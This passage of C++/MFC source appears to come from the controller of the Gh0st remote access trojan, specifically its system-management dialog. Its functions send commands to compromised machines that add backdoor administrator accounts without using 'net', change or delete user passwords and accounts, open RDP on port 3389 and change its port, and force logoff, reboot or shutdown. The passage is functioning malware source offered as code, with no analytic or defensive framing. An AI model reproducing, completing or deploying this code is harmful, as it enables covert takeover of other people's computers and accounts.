	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		str =  (char*)lpBuffer + dwOffset;
		m_list.InsertItem(i, str);
		dwOffset += str.GetLength()+1;
		str =  (char*)lpBuffer + dwOffset;
		dwOffset += str.GetLength()+1;
		m_list.SetItemText(i, 1, str);
		str =  (char*)lpBuffer + dwOffset;
		dwOffset += str.GetLength()+1;
		m_list.SetItemText(i, 2, str);
	}
}

void CSystemDlg::ShowUserStateList()
{
	DeleteList();

	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, "用户", LVCFMT_LEFT, 100);
	m_list.InsertColumn(1, "标识", LVCFMT_LEFT, 40);
	m_list.InsertColumn(2, "状态", LVCFMT_LEFT, 100);
	m_list.InsertColumn(3, "会话", LVCFMT_LEFT, 70);
	m_list.InsertColumn(4, "远程桌面IP", LVCFMT_LEFT, 150);
	
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	
	char	*strUserName; 
	char	*strSessionId;  
	char	*strClientAddress;  
	char	*strWinStationName; 
	char	*ConnectionState; 
	
	DWORD	dwOffset = 0;
	CString str;
	
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		strUserName = lpBuffer + dwOffset;
		m_list.InsertItem(i, strUserName);
		dwOffset += lstrlen(strUserName)+1;
		
		strSessionId = lpBuffer + dwOffset;
		str.Format("%d",atoi(strSessionId));
		m_list.SetItemText(i, 1, str);
		dwOffset += lstrlen(strSessionId)+1;
		
		strClientAddress = lpBuffer + dwOffset;
		m_list.SetItemText(i, 4, strClientAddress);
		dwOffset += lstrlen(strClientAddress)+1;
		
		strWinStationName = lpBuffer + dwOffset;
		m_list.SetItemText(i, 3, strWinStationName);
		dwOffset += lstrlen(strWinStationName)+1;
		
		ConnectionState = lpBuffer + dwOffset;
		m_list.SetItemText(i, 2, ConnectionState);
		dwOffset += lstrlen(ConnectionState)+1;
		
	}
}

void CSystemDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	if (nIDEvent == 1)
	{
		CString str;

		str.Format("进程数: %d",dwPrs);
		m_wndStatusBar.SetPaneText(0, str); 

		str.Format("CPU 使用率: %d%%",dwCpu);
		m_wndStatusBar.SetPaneText(1, str); 

		str.Format("物理内存: %d%%",dwMem);
		m_wndStatusBar.SetPaneText(2, str); 
	}

	CDialog::OnTimer(nIDEvent);
}

void CSystemDlg::OnCancel() 
{
	// TODO: Add extra cleanup here
	OnClose();
	CDialog::OnCancel();
}

void CSystemDlg::OnChangeUserState(UINT uState)
{
	POSITION pos = m_list.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	if  (pos  ==  NULL)
	{
		if (uState == COMMAND_DISCONNECTUSER)
			::MessageBox(m_hWnd,_T("请先选择要断开的用户!"),"提示",MB_YESNO);
		else
			::MessageBox(m_hWnd,_T("请先选择要注销的用户!"),"提示",MB_YESNO);
		
		return;
	}
	
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (m_list.GetSelectedCount() * 4));
	lpBuffer[0] = uState; 
	
	DWORD	dwOffset = 1;
	int	nItem=0;
	
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		nItem = m_list.GetNextSelectedItem(pos);
		DWORD dwProcessID = m_list.GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	CString str,strCaption;
	char *lpTips = _T("警告: 断开用户会导致不希望发生的结果，\n");
	if (uState == COMMAND_LOGOFF_USER)
	{
		strCaption = "注销用户警告";
		lpTips = _T("警告: 注销用户会导致不希望发生的结果，\n");
		str.Format(_T("%s确实 想注销  %s 用户吗?"), lpTips, m_list.GetItemText(nItem,0));
	}
	else
	{
		strCaption = "断开用户警告";
		str.Format(_T("%s确实 想断开  %s 用户吗?"), lpTips, m_list.GetItemText(nItem,0));
	}

	if (::MessageBox(m_hWnd, str, strCaption, MB_YESNO|MB_ICONQUESTION) == IDNO)
	{
		LocalFree(lpBuffer);
		return;
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnChangeUser(UINT uState)
{
	POSITION pos = m_list.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	CString Data;
	CString Name;
	
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = uState;
	dwOffset = 1;
	
	if  (pos  ==  NULL)
	{
		return;
	}
	else
	{
		while(pos)
		{
			int	nItem = m_list.GetNextSelectedItem(pos);
			Name = m_list.GetItemText(nItem, 0);
			Data += Name;
			Data += _T("\r\n");
		}
		Data = Data.Left(Data.GetLength() - 2);
		memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1)*sizeof(TCHAR));
		dwOffset += (Data.GetLength() + 1)*sizeof(TCHAR);
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSystemDlg::OnMenuitemActiveUser() 
{
	// TODO: Add your command handler code here
	OnChangeUser(COMMAND_ACITVEUSER);

}

void CSystemDlg::OnMenuitemDisableUser() 
{
	// TODO: Add your command handler code here
	OnChangeUser(COMMAND_DISABLEEUSER);

}

void CSystemDlg::OnMenuitemAddUser() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("无NET添加用户"), _T("格式：用户名|密码|用户组"), this,TRUE,"123|123|Administrators");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	
	CString Username, Password, Administrators;
	
    AfxExtractSubString(Username,dlg.m_str.GetBuffer(0),0,'|'); 
    AfxExtractSubString(Password,dlg.m_str.GetBuffer(0),1,'|'); 
	AfxExtractSubString(Administrators,dlg.m_str.GetBuffer(0),2,'|');
	
	
	if (Username.IsEmpty()|| Password.IsEmpty()||Administrators.IsEmpty())
	{
		::MessageBox(m_hWnd,"输入的信息不合法", "错误",NULL);
		return;
	}
	
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_NET_USER;
	dwOffset = 1;
	
	memcpy(lpBuffer + dwOffset, Username.GetBuffer(0), (Username.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Username.GetLength() + 1)*sizeof(TCHAR);
	
	memcpy(lpBuffer + dwOffset, Password.GetBuffer(0), (Password.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Password.GetLength() + 1)*sizeof(TCHAR);
	
	memcpy(lpBuffer + dwOffset, Administrators.GetBuffer(0), (Administrators.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Administrators.GetLength() + 1)*sizeof(TCHAR);
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSystemDlg::OnMenuitemChangePass() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_list.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	if  (pos  ==  NULL)
	{
		::MessageBox(m_hWnd,_T("请先选择要修改密码的用户!"),"提示",MB_YESNO);
		
		return;
	}
	
	CInputDialog	dlg;
	dlg.Init(_T("修改密码"), _T("请输入要修改的密码:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	
	CString Data;
	CString Name;
	
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_CHANGE_USERPASS;
	dwOffset = 1;
	
	
	
	while(pos)
	{
		int	nItem = m_list.GetNextSelectedItem(pos);
		Name = m_list.GetItemText(nItem, 0);
		Data += Name;
		Data += _T("\r\n");
	}
	Data = Data.Left(Data.GetLength() - 2);
	memcpy(lpBuffer + dwOffset, Data.GetBuffer(0), (Data.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Data.GetLength() + 1)*sizeof(TCHAR);
	
	memcpy(lpBuffer + dwOffset, dlg.m_str.GetBuffer(0), (dlg.m_str.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (dlg.m_str.GetLength() + 1)*sizeof(TCHAR);
	
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSystemDlg::OnMenuitemDelUser() 
{
	// TODO: Add your command handler code here
	OnChangeUser(COMMAND_DELUSER);

}

void CSystemDlg::OnMenuitemDisconnectUser() 
{
	// TODO: Add your command handler code here
	OnChangeUserState(COMMAND_DISCONNECTUSER);

}

void CSystemDlg::OnMenuitemLogoffUser() 
{
	// TODO: Add your command handler code here
	OnChangeUserState(COMMAND_LOGOFF_USER);

}

void CSystemDlg::OnButtonMstsc() 
{
	// TODO: Add your control notification handler code here
	TCHAR szMSTSC[MAX_PATH], szMsg[MAX_PATH];
	GetModuleFileName(NULL, szMSTSC, sizeof(szMSTSC));
	*_tcsrchr( szMSTSC, '\\' ) = '\0';
	lstrcat(szMSTSC, _T("\\Control\\mstsc.exe"));
	if (GetFileAttributes(szMSTSC) == INVALID_FILE_ATTRIBUTES)
	{
		wsprintf(szMsg, _T("本地文件 %s丢失!\n无法继续连接!"), szMSTSC);
		MessageBox(szMsg, _T("警告!"), MB_ICONWARNING | MB_OK);
		return;
	}

	CString str;
	str.Format("%s:%d",IPAddress,nRemotePort);

	CInputDialog	dlg;
	dlg.Init(_T("远程桌面连接"), _T("格式：IP:端口"), this,TRUE,str);
	if (dlg.DoModal() != IDOK)   
		return;


/*	if (((CButton*)GetDlgItem(IDC_CHECK_CONSOLE))->GetCheck())*/
		wsprintf(szMsg, _T("/console /v:%s"), dlg.m_str.GetBuffer(0));
/*
	else
		wsprintf(szMsg, _T("/v:%s:"), dlg.m_str.GetBuffer(0));*/

	ShellExecute(NULL, _T("open"), szMSTSC, szMsg, NULL, SW_SHOWNORMAL);
}

void CSystemDlg::OnButtonChanageport() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strPort;
	GetDlgItemText(IDC_EDIT_PORT, strPort);
	int nPacketLength = 1 + strPort.GetLength() * 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_3389_PORT;
	memcpy(lpPacket + 1, strPort.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete []lpPacket;
	::MessageBox(m_hWnd,_T("命令已经发送\r\n重启电脑后生效!"),_T("提示"),NULL);
}

void CSystemDlg::OnButtonOpen3389() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_OPEN_3389;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}

void CSystemDlg::OnMenuitemSLogoff() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_S_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
}

void CSystemDlg::OnMenuitemSReboot() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_S_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
}

void CSystemDlg::OnMenuitemSShutdown() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_S_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
}

void CSystemDlg::OnNetAdd() 
{
	// TODO: Add your control notification handler code here
	CString strTitle;
	CString name , pass , group;

	GetDlgItemText(IDC_EDIT_USER, name);
	GetDlgItemText(IDC_EDIT_PASS, pass);
	GetDlgItemText(IDC_EDIT_admin, group);
	name.MakeLower();
	
	if (strlen(name) < 1 || strlen(pass) < 1)
	{
		MessageBox("请输入用户名和密码!!...", "操作提示...", MB_YESNO | MB_ICONWARNING);
		return;
	}
	
	int nPacketLength = lstrlen(name) + lstrlen(pass) + lstrlen(group) + 5;
	LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	
	lpPacket[0] = COMMAND_NET_USER;
	
	DWORD	dwOffset = 1;
	memcpy(lpPacket + dwOffset, name, lstrlenA(name) + 1);
	dwOffset += lstrlenA(name) + 1;
	memcpy(lpPacket + dwOffset, pass, lstrlenA(pass) + 1);
	dwOffset += lstrlenA(pass) + 1;
	memcpy(lpPacket + dwOffset, group, lstrlenA(group) + 1);
	dwOffset += lstrlenA(group) + 1;

	m_iocpServer->Send(m_pContext,lpPacket, dwOffset);
    LocalFree(lpPacket);
	
	OnNetPreservations();   //保存修改
}

void CSystemDlg::OnNetPreservations()   //保存修改
{
	// 保存配置
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务器", "Netuser", m_net_user);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("服务器", "Netpass", m_net_pass);
}